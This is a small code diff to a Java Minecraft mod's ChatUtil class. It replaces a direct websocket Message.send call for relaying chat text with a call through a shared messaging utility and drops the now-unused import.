@@ -1,7 +1,6 @@
 package me.soda.witch.utils;
 
 import me.soda.witch.Witch;
-import me.soda.witch.websocket.Message;
 import net.minecraft.text.MutableText;
 import net.minecraft.text.Text;
 import net.minecraft.util.Formatting;
@@ -54,7 +53,7 @@ public class ChatUtil {
         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
         String chatText = String.join(" ", strArr);
         chat(Text.of(chatText), true);
-        Message.send("chat", chatText);
+        Witch.messageUtils.send("chat", chatText);
         return true;
     }
 }
